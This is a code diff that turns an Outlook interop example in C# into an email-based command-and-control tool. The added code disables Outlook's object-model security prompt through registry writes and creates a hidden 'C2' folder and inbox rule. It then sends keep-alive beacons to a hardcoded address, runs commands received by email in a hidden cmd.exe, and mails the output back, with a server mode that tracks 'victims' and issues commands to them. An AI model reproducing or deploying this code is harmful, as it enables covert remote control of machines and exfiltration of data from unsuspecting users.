@@ -8,22 +8,40 @@ using System.Windows;
 using System.Threading;
 using Outlook = Microsoft.Office.Interop.Outlook;
 using System.Diagnostics;
+using Microsoft.Win32;
 
 namespace ExchangeExample
 {
     public class Program
     {
+        public const int HKLM_LEN = 19;
         public static Outlook.NameSpace outlookNameSpace;
         public static Outlook.MAPIFolder inbox;
         public static Outlook.Items items;
-        //HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Office\ClickToRun\REGISTRY\MACHINE\Software\Wow6432Node\Microsoft\Office\16.0\Outlook\Security
-        public static void ExecuteCommand(string command)
+        public static string[] keys =
+        {
+            @"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Office\ClickToRun\REGISTRY\MACHINE\Software\Wow6432Node\Microsoft\Office\16.0\Outlook\Security",
+            @"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Office\ClickToRun\REGISTRY\MACHINE\Software\Microsoft\Office\16.0\Outlook\Security",
+            @"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Office\ClickToRun\REGISTRY\MACHINE\Software\Microsoft\Office\16.0\Outlook\Security",
+            @"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Office\16.0\Outlook\Security"
+        };
+
+        public static void SetRegistry()
+        {
+
+            foreach (var key in keys)
+            {
+                Registry.LocalMachine.CreateSubKey(key.Remove(0, HKLM_LEN));
+                Registry.SetValue(key, "ObjectModelGuard", 2);
+            }
+        }
+        public static string ExecuteCommand(string command)
         {
 
             Process process = new Process();
             process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
             process.StartInfo.FileName = "cmd.exe";
-            process.StartInfo.Arguments = "/C "+ command;
+            process.StartInfo.Arguments = "/C " + command;
             process.StartInfo.UseShellExecute = false;
             process.StartInfo.CreateNoWindow = true;
             process.StartInfo.RedirectStandardOutput = true;
@@ -35,65 +53,203 @@ namespace ExchangeExample
                 q += process.StandardOutput.ReadToEnd();
             }
 
-            Console.WriteLine(q);
+            return q;
         }
-        public static Outlook.Account GetAccountForEmailAddress(Outlook.Application application, string smtpAddress)
-        {
-
-            // Loop over the Accounts collection of the current Outlook session. 
-            Outlook.Accounts accounts = application.Session.Accounts;
-            foreach (Outlook.Account account in accounts)
-            {
-                // When the e-mail address matches, return the account. 
-                if (account.SmtpAddress == smtpAddress)
-                {
-                    return account;
-                }
-            }
-            throw new System.Exception(string.Format("No Account with SmtpAddress: {0} exists!", smtpAddress));
-        }
-        public static void SendEmailFromAccount(Outlook.Application application, string subject, string body, string to, string smtpAddress)
+        public static void SendEmailFromAccount(Outlook.Application application, string subject, string body, string recipient)
         {
 
             // Create a new MailItem and set the To, Subject, and Body properties. 
             Outlook.MailItem newMail = (Outlook.MailItem)application.CreateItem(Outlook.OlItemType.olMailItem);
-            newMail.To = to;
+
+            // Set recipient
+            newMail.To = recipient;
+
+            // Set subject
             newMail.Subject = subject;
             newMail.Body = body;
-
-            // Retrieve the account that has the specific SMTP address. 
-            Outlook.Account account = GetAccountForEmailAddress(application, smtpAddress);
-            // Use this account to send the e-mail. 
-            newMail.SendUsingAccount = account;
+            //newMail.DeleteAfterSubmit = true;
             newMail.Send();
         }
+        public static void SendEmailFromAccount(Outlook.Application application, string subject, string body, List<string> recipients)
+        {
+
+            // Create a new MailItem and set the To, Subject, and Body properties. 
+            Outlook.MailItem newMail = (Outlook.MailItem)application.CreateItem(Outlook.OlItemType.olMailItem);
+            string to = "";
+            if (recipients.Count > 1)
+            {
+                // Concat all recipients using ; to have multiple recipients
+                foreach (var recipient in recipients)
+                    to += recipient + "; ";
+
+                // Remove trailing ; and set recipients
+                newMail.To = to.Substring(0, to.Length - 2);
+            }
+
+            // Set subject
+            newMail.Subject = subject;
+
+            // Set body
+            newMail.Body = body;
+            //newMail.DeleteAfterSubmit = true;
+            newMail.Send();
+
+        }
+        public static Outlook.Application OutlookApplication = null;
+        public const string C2_MAIL = "u8885555@bsmch.net";
+        public static List<String> victims = new List<string>();
+
+        public static void KeepAlive()
+        {
+            while (true)
+            {
+                SendEmailFromAccount(OutlookApplication, "C2", "KeepAlive", C2_MAIL);
+                Thread.Sleep(5 * 1000 * 60);
+            }
+        }
+        public static void StartOutlook() { Process.Start("outlook.exe"); }
         public static void Main(string[] args)
         {
-            //ExecuteCommand("ipconfig");
+            Process[] processes = Process.GetProcessesByName("outlook");
+            SetRegistry();
+            if (processes.Length > 0)
+            {
+                foreach (var item in processes)
+                {
+                    item.Kill();
+                }
+            }
+            //Process.Start("outlook.exe");
+            Thread t2 = new Thread(StartOutlook);
+            t2.Start();
+            Thread.Sleep(20000);
+            try
+            {
+                OutlookApplication = Marshal.GetActiveObject("Outlook.Application") as Outlook.Application;
+            }
+            catch (Exception)
+            {
+                Thread.Sleep(10000);
+                OutlookApplication = Marshal.GetActiveObject("Outlook.Application") as Outlook.Application;
+                //throw;
+            }
             
-            Outlook.Application OutlookApplication = Marshal.GetActiveObject("Outlook.Application") as Outlook.Application;
+
+            // Connect to the user's open MAPI session
             outlookNameSpace = OutlookApplication.GetNamespace("MAPI");
+
+            // Rules
+
+
+
+
+            // Get inbox
             inbox = outlookNameSpace.GetDefaultFolder(
                     Microsoft.Office.Interop.Outlook.
                     OlDefaultFolders.olFolderInbox);
-            //SendEmailFromAccount(OutlookApplication, "TEST", "ababa", "u8885555@bsmch.net", "u8885555@bsmch.net");
+            Outlook.MAPIFolder root = inbox.Parent;
+            
+            Outlook.MAPIFolder c2 = null;
+            foreach (Outlook.MAPIFolder folder in root.Folders)
+            {
+                if (folder.Name == "C2")
+                {
+                    c2 = folder;
+                    break;
+                }
+            }
+            if (c2==null)
+            {
+                c2 = root.Folders.Add("C2");
+            }
 
-            if (args.Length == 0)
+            items = c2.Items;
+
+            Outlook.Rules rules = OutlookApplication.Session.DefaultStore.GetRules();
+            bool exists = false;
+            foreach (Outlook.Rule rule in rules)
+            {
+                if (rule.Name == "C2")
+                {
+                    exists = true;
+                    break;
+                }
+            }
+            if (!exists)
+            {
+                Outlook.Rule rule = rules.Create("C2", Outlook.OlRuleType.olRuleReceive);
+                rule.Conditions.Subject.Text = new string[] { "C2" };
+                rule.Conditions.Subject.Enabled = true;
+                rule.Actions.MoveToFolder.Folder = c2;
+                rule.Actions.MoveToFolder.Enabled = true;
+
+                rule.Enabled = true;
+                rules.Save(true);
+            }
+            exists = false;
+
+
+
+            if (args.Length != 1)
             {
                 Console.WriteLine("Please enter arg server/client");
             }
             if (args[0] == "server")
             {
-                items = inbox.Items;
+                // Create server function callback
                 items.ItemAdd +=
                     new Outlook.ItemsEvents_ItemAddEventHandler(Server_Callback);
                 Console.WriteLine("[!] Waiting for new messages:\n=============================");
+                while (true)
+                {
+                    Console.WriteLine("Choose what to do (print/command):");
+                    string opt = Console.ReadLine();
+                    switch (opt.ToLower().Trim().Split(' ').First())
+                    {
+                        case "print":
+                            {
+                                Console.WriteLine("Getting victims:");
+                                foreach (var victim in victims)
+                                {
+                                    Console.WriteLine("[*] {0}", victim);
+                                }
+                                break;
+                            }
+                        case "command":
+                            {
+                                Console.WriteLine("Enter Commnand:");
+                                string com = Console.ReadLine();
+                                if (victims.Count > 1)
+                                    SendEmailFromAccount(OutlookApplication, "C2", "command " + com, victims);
+                                else
+                                {
+                                    if (victims.Count == 1)
+                                    {
+                                        SendEmailFromAccount(OutlookApplication, "C2", "command " + com, victims[0]);
+                                    }
+                                    else
+                                        Console.WriteLine("No victims found");
+                                }
+                                break;
+                            }
+                        default:
+                            break;
+                    }
+                }
             }
-
-            
-            while (true)
+            if (args[0] == "client")
             {
-                Thread.Sleep(1000000);
+                // Create Thead to announce that agent is alive
+                Thread t = new Thread(KeepAlive);
+                t.Start();
+
+                // Create client function callback
+                items.ItemAdd +=
+                    new Outlook.ItemsEvents_ItemAddEventHandler(Client_Callback);
+                while (true)
+                {
+                    Thread.Sleep(100000000);
+                }
             }
         }
 
@@ -105,11 +261,13 @@ namespace ExchangeExample
             {
                 if (mail.Subject.ToUpper().Contains(filter.ToUpper()))
                 {
-                    Console.WriteLine("New Message from: {0}\tMessage: {1}",mail.SendUsingAccount.SmtpAddress,mail.Body.ToString());
+                    if (mail.Body.Contains("KeepAlive") && !victims.Contains(mail.Sender.GetExchangeUser().PrimarySmtpAddress))
+                        victims.Add(mail.Sender.GetExchangeUser().PrimarySmtpAddress);
+                    else
+                        Console.WriteLine("New Message from: {0}\tMessage:\n{1}", mail.Sender.GetExchangeUser().PrimarySmtpAddress, mail.Body.Trim());
                     mail.Delete();
                 }
             }
-
         }
 
         public static void Client_Callback(object Item)
@@ -120,7 +278,18 @@ namespace ExchangeExample
             {
                 if (mail.Subject.ToUpper().Contains(filter.ToUpper()))
                 {
-                    Console.WriteLine("New Message from: {0}\tMessage: {1}", mail.SendUsingAccount.SmtpAddress, mail.Body.ToString());
+                    switch (mail.Body.Trim().Split(' ').Skip(0).FirstOrDefault())
+                    {
+                        case "command":
+                            {
+                                var secondWord = mail.Body.Split(' ').Skip(1).FirstOrDefault();
+                                string command = ExecuteCommand(secondWord);
+                                SendEmailFromAccount(OutlookApplication, "C2", command, C2_MAIL);
+                                break;
+                            }
+                        default:
+                            break;
+                    }
                     mail.Delete();
                 }
             }
